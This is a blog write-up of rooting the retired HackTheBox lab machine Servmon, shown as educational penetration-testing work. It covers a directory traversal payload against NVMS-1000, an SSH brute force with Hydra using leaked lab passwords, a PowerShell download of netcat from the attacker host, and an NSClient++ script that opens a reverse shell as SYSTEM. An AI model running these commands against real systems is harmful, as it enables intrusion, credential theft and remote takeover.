---
layout: post
title: "Writeup: HackTheBox Servmon - NO Metasploit"
description: "Rooting Servmon without using Metasploit."
tags: pentest hackthebox writeup
---

This series will follow my exercises in [HackTheBox][].
All published writeups are for retired HTB machines.
Whether or not I use Metasploit to pwn the server will be indicated in the title.
 
# Servmon

_<small>Difficulty: Easy</small>_

_<small>Machine IP: 10.10.10.184</small>_

I kick things off with a port scan.

```bash
sudo nmap -sS -T4 -p- 10.10.10.184

Nmap scan report for 10.10.10.184
Host is up (0.016s latency).
Not shown: 65516 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
5666/tcp  open  nrpe
6063/tcp  open  x11
6699/tcp  open  napster
7680/tcp  open  pando-pub
8443/tcp  open  https-alt
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
```

A bunch of ports here, but they are mostly RPC ports that I will ignore.

```bash
sudo nmap -sS -T4 -A -p21,22,80,135,139,445,5040,5666,6063,6699,7680,8443,49664,49665,49666,49667,49668,49669,49670 10.10.10.184

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp    open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|     AuthInfo:
|   GenericLines, GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|_    </html>
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5666/tcp  open  tcpwrapped
6063/tcp  open  tcpwrapped
6699/tcp  open  napster?
7680/tcp  open  pando-pub?
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
```

Notably:

- FTP server is exposed, and allows anonymous access
- Some kind of web server is running on port 80 but, more importantly,an `NSClient++` server is running on `tcp/8443`

`https://10.10.10.184:8443/index.html` returns a web page for [NSClient++][].
I find two [ExploitDB][] results for NSClient++:

- [Privilege Escalation][privesc]
- [Authenticated Remote Code Execution][rce]

Going to tuck those into my back pocket.
Attempting a login request triggers this request captured by [Burp][]:

```
POST /doLogin HTTP/1.1
Host: 10.10.10.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.184/Pages/login.htm
If-Modified-Since: 0
Authorization: Basic dGVzdDp0ZXN0
Content-Type: text/plain;charset=UTF-8
Content-Length: 103
Connection: close
Cookie: lang_type=0x0409%24en-us; dataPort=6063

<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-1000" clientType="WEB"/>
```

I notice `systemType="NVMS-1000"` in the request body.
Searching for this on ExploitDB returns a possible directory traversal.

```bash
searchsploit nvms
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
NVMS 1000 - Directory Traversal                                                 | hardware/webapps/47774.txt
OpenVms 5.3/6.2/7.x - UCX POP Server Arbitrary File Modification                | multiple/local/21856.txt
OpenVms 8.3 Finger Service - Stack Buffer Overflow                              | multiple/dos/32193.txt
TVT NVMS 1000 - Directory Traversal                                             | hardware/webapps/48311.py
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results 
```

`NVMS 1000 - Directory Traversal` describes the following directory traversal attack:

```
# Title: NVMS-1000 - Directory Traversal
# Date: 2019-12-12
# Author: Numan T<C3><BC>rle
# Vendor Homepage: http://en.tvt.net.cn/
# Version : N/A
# Software Link : http://en.tvt.net.cn/products/188.html

POC
---------
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 12.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

Response
---------

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

Reproducing this in Burp is successful, but I don't immediately have anything to do with this.

I decide to take a look at the other ports.
Since FTP is open, I test for anonymous access and find that it is successful.

```bash
ftp 10.10.10.184
```

I can't upload any files, but I can download what is available on the system.
I first check to see what users exist on the target:

```
ftp> cd /Users
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:06PM       <DIR>          Nadine
01-18-20  12:08PM       <DIR>          Nathan
226 Transfer complete.
```

There are two users, `Nadine` and `Nathan`.
I check for any interesting files under each user's home directory.
Hmm, `Confidential.txt` sounds promising...

```
ftp> cd /Users/Nadine
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:08PM                  174 Confidential.txt
226 Transfer complete.
ftp> get Confidential.txt ./Confidential.txt
local: ./Confidential.txt remote: Confidential.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
174 bytes received in 0.01 secs (14.6953 kB/s)
```

The contents of the file are:

> Nathan,
>
> I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
>
> Regards
>
> Nadine

I can't access anything further with FTP, but now I have a good idea what to use that directory traversal attack on.

```
GET ../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt 
```

With this attack, I get back the `Passwords.txt` file, which contains a series of passwords.
Presumably, one of these is `Nathan`'s actual password.

```
HTTP/1.1 200 OK
Content-type: text/plain
Content-Length: 156
Connection: close
AuthInfo: 

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

I tried to read `/Users/Nathan/Desktop/user.txt` or `/Users/Nadine/Desktop/user.txt`, but neither was successful through the directory traversal.
Well, with these passwords and the two usernames on the system we have enough information to attempt an SSH brute force with [Hydra][].

```bash
hydra -L users.txt -P pass.txt ssh://10.10.10.184

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-29 20:49:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:2/p:8), ~1 try per task
[DATA] attacking ssh://10.10.10.184:22/
[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-29 20:49:15
```

`hydra` finds valid SSH credentials for `Nadine` - `nadine / L1k3B1gBut7s@W0rk`.
This gives me a user shell.

Given that I know there is a privilege escalation vulnerability in NSClient++, that is what I focus on now.
The steps for the privilege escalation [as documented on ExploitDB][privesc] are:

1. Run `nscp web -- password --display` to get the current password
2. Login and enable the `CheckExternalScripts` and `Scheduler` modules
3. Download a netcat executable to `c:\temp` from the attacker's machine
4. Set up a netcat listener on the attacker's machine
5. Add a script to NSClient++ to call netcat as a `.bat` script and save NSClient++ settings
6. Add a Schedule to call this script every minute and save settings
7. Restart the computer and wait for the reverse shell on the attacker's machine

The Scheduler portion and restarting the machine seem to do with maintaining persistence, which I don't need for this exercise.
I should be able to invoke the script manually with a `nscp` command and trigger a reverse shell through netcat.

Running `nscp -h` shows that I have CLI access to NSClient++.

```bat
nadine@SERVMON C:\Program Files\NSClient++>nscp web -h
Usage: nscp web [install|password|add-user|add-role] --help

nadine@SERVMON C:\Program Files\NSClient++>nscp web password -h
  help                 Show help.
  set=ARG              Set the new password
  display              Display the current configured password
  only-web             Set the password for WebServer only (if not specified
                       the default password is used)
```

Let's get the password.

```bat
nadine@SERVMON C:\Program Files\NSClient++>nscp web password --display
Current password: ew2x6SsGTxjRwXOT
```

Now, I copy the pre-compiled Windows netcat executable that exists on a default Kali installation over to the target with a simple Python web server.

My machine:

```bash
cp /usr/share/windows-resources/binaries/nc.exe .
python3 -m http.server
```

On the target:

```bat
cd C:\Temp
powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.19:8000/nc.e
xe', 'nc.exe')"
```

Now I set up a netcat listener on my machine:

```bash
sudo nc -lvnp 4444
```

On the target, I "upload" the netcat executable to the NSClient++ web server with a data payload that will trigger a reverse shell.

```bat
curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/root.bat --data-binary "C:\Temp\nc.exe 10.10.14.19 4444 -e cmd.exe"
```

I am prompted for the admin password (`ew2x6SsGTxjRwXOT`), which I supply from the helpful command earlier.
Then, I can execute the script via another NSClient++ API endpoint and obtain a SYSTEM shell.

```bat
curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/root/commands/execute?time=3m
```

I again enter the admin password when prompted and get my shell.

![root shell][]

[burp]: https://portswigger.net/burp
[exploitdb]: https://www.exploit-db.com/
[hackthebox]: https://www.hackthebox.eu
[hydra]: https://tools.kali.org/password-attacks/hydra
[nsclient++]: https://nsclient.org/
[privesc]: https://www.exploit-db.com/exploits/46802
[rce]: https://www.exploit-db.com/exploits/48360

[root shell]: /assets/img/htb/servmon/root-shell.png
